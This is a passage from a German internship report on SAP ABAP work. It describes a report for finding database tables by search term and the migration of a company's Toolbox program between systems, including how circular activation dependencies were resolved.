Abbildung @fig:input zeigt die Eingabemaske für den Bericht. Hier sieht man ein weiteres Eingabefeld, das vorher nicht besprochen wurde. Das Feld "Row Limit" wird verwendet, um die Anzahl der Zeilen zu begrenzen, die aus der Tabelle "dd03t" ausgewählt werden. Dies ist in den meisten Anwendungsfällen nicht sinnvoll, da es die `UP TO x ROWS`-Anweisung verwendet, die die Auswahl willkürlich nach der angegebenen Anzahl von Zeilen beendet. Es kann immer noch nützlich sein, wenn beispielsweise die `WHERE`-Klausel einen großen Suchraum erzeugt, den der Benutzer noch weiter einschränken möchte, mit der Möglichkeit, einen Teil des Suchraums zufällig auszuschneiden. Es war auch bei der Erstellung des Berichts hilfreich und führt zu keinem Problem, da das Feld optional ist.

![Screenshot der Ausgabetabelle für Suchbegriffe `CHECK` und `CASE`](images/output.png)

In Abbildung @fig:output sieht man die Ausgabetabelle, die vom Report gefüllt wird. Genau diese Tabelle ergibt sich aus der Verwendung der Suchbegriffe `CHECK` und `CASE`, die man in der Kopfzeile der Ausgabemaske sehen kann. Die Tabelle besteht aus vier Spalten, das tabname-Feld enthält den Namen der Tabelle/Struktur und drei boolesche Spalten, die angeben, ob die Tabelle/Struktur mindestens einen der Suchbegriffe im Namen, in der Beschreibung oder in den Spalten enthält.
Da diese Ergebnistabelle AVL (ABAP List Viewer) verwendet, hat der Benutzer die Möglichkeit, die Tabelle über die SAP GUI zu sortieren oder zu filtern und sie sogar direkt in eine Excel-Datei für die weitere Arbeit zu exportieren.

Ein Problem, das aufgetreten ist, besteht darin, dass es keine einfache Möglichkeit gibt, den Header der drei booleschen Spalten festzulegen. Wie im Code-Snippet unten zu sehen ist, sind die „in*“-Spalten vom Typ „abap_bool“, ein von SAP bereitgestelltes Datumselement.

Das Problem ist, dass dieses Datenelement keine Beschreibungstexte hat. Wenn sie diese Texte hätten, würden sie nicht zu diesem Anwendungsfall passen, aber sie können im Code geändert werden. Dies ist nicht möglich, wenn die Spalten von vornherein keinen Kopftext haben.

Die Lösung dieses Problems war trivial, da es eine gängige Operation ist, Datenelemente speziell für einen Bericht zu erstellen. Hier habe ich drei Datenelemente, die den Datentyp `abap_bool` haben, und die dazugehörigen Beschreibungstexte angelegt.

### Ergebnisse

Wie in der Aufgabe erwähnt, ist es wichtig, ein Tool zu haben, das einem Entwickler helfen kann, benötigte Tabellen in einem neuen System zu finden. Diese Funktion wird von meinem Bericht gut erreicht. Sicherlich gibt es weitere Funktionen, die zu diesem Bericht hinzugefügt werden könnten, die sich in ihrer Nützlichkeit unterscheiden. Lassen Sie beispielsweise den Benutzer entscheiden, wo genau der Bericht nach den Suchbegriffen sucht, oder finden Sie nützlichere Orte, um die Informationen zu finden, und vergrößern Sie so den Suchraum. Diese Features würden jedoch meistens die Lebensqualität bei der Nutzung des Berichts erhöhen oder die Funktionalität leicht erhöhen. Zur praktischen Nützlichkeit dieses Berichts kann keine spezifische Aussage gemacht werden, da die Migration noch nur langsam begonnen hat und mir zum Zeitpunkt des Schreibens kein Nutzungsfeedback vorliegt.

## Toolbox-Migration

Wie in den Aufgaben kurz erwähnt, ist die Toolbox ein Programm, das von Kunden verwendet wird, um alle von Energy4U gelieferten Tools einfacher zu navigieren und zu verwalten.

![Screenshot der Toolbox](images/explorer.png)

Die spezifischen Programme in der Toolbox sind für meine Aufgabe nicht von Bedeutung, da ich nur damit beauftragt wurde, den Toolbox-Übersichtsbericht selbst zu erstellen.

Bevor ich mit dem Bericht beginnen konnte, musste ich die Struktur des Toolbox-Programms finden und verstehen, das sehr in einzelne Teile unterteilt ist.

[//]: # (```{.mermaid caption="Umgebungsstruktur des Toolbox-Programms"})

[//]: # (graph TD)

[//]: # ( core[[Toolbox core]])

[//]: # ( docu[[Toolbox-Dokumentation]])

[//]: # ( html[[Toolbox HTML]])

[//]: # ( auth[[Toolbox-Autorität]])

[//]: # ( Unterdiagramm "Toolbox-Paket")

[//]: # ( explorer(Toolbox Explorer-Programm))

[//] : # ( docu-.->html)

[//]: # ( core-->explorer)

[//]: # ( explorer-.->docu)

[//]: # ( explorer-.->auth )

[//]: # ( auth---authEx([Programm und <br/>Elemente zur<br/>Autoritätsprüfung]))

[//]: # ( html---htmlEx& #40;[erforderliche Elemente<br/>zur Erleichterung der<br/>HTML-Darstellung in SAP]))

[//]: # ( docu---docuEx([erforderliche Elemente<br/>zur Erleichterung Anzeige der<br/>Programmdokumentation]))

[//]: # ( end)

[//]: # ( subgraph "Base GUI Package")

[//]: # ( tree([classes to<br/>facilitate tree<br/>component]))

[//]: # ( Dynpro([SAP-Funktion<br/>-Gruppe für<br/>Dynpros]))

[//]: # ( Explorer-.->Baum)

[//] : # ( dynpro-.-explorer)

[//]: # ( Ende)

[//]: # (```)

Wie man in obiger Abbildung sehen kann, ist das Programm `Toolbox Explorer` das Hauptprogramm, das beim Öffnen der Toolbox ausgeführt wird. Nicht jede Klasse und jedes Programm ist in der Abbildung dargestellt, sondern Erläuterungen in den runden Knoten. Da der größte Teil dieser Aufgabe aus dem langwierigen Kopieren von SAP-Elementen in das neue System bestand, gab es einige ungewöhnliche Probleme, die wahrscheinlich nur in einer ähnlichen Situation auftreten. Es gab mehrere Fälle, in denen die Abhängigkeiten zwischen den Elementen kreisförmig waren. Dies ist kein Problem bei der Ausführung eines Programms und auch nicht während der Entwicklung, da Klassen wahrscheinlich Schritt für Schritt entwickelt und in Blöcken statt als Ganzes aktiviert werden. Ein Beispiel für eine solche Abhängigkeitsschleife ist das Toolbox-HTML-Paket, wobei die aktivierte Klasse `CL_HTML_ELEMENT` abhängig vom aktiven Tabellentyp `TT_HTML_ELEMENTS` war, welche Intern abhängig von der Struktur `S_HTML_ELEMENT` auch aktiv war. Die Schleife entsteht, da die oben genannte Struktur von der zitierten Klasse abhängig ist. Um dies zu lösen, habe ich die `S_HTML_ELEMENT`-Struktur so bearbeitet, dass sie kein Feld der Klasse enthält. Dies unterbricht die Kette und ermöglicht die Aktivierung aller 3 Elemente. Danach habe ich das Feld wieder in die Struktur eingefügt und wieder aktiviert.

### Ergebnisse

Da ich mich zum Zeitpunkt des Schreibens noch in meiner Praxisphase bei Energy4U befinde und die Migration der Toolbox auf das neue System noch nicht abgeschlossen ist. Alle Elemente innerhalb der Pakete, die in der neuesten Abbildung zu sehen sind, werden migriert, und die Datenbanktabelle wird mit den Elementen gefüllt, die im Baum angezeigt werden sollen. Es scheint ein Problem mit der Displayausgabe zu geben, an dessen Behebung ich derzeit noch arbeite.

#### Danksagung

Aus diesem Grund stammt der in diesem Abschnitt sichtbare Screenshot aus der Toolbox, die auf dem alten System ausgeführt wird
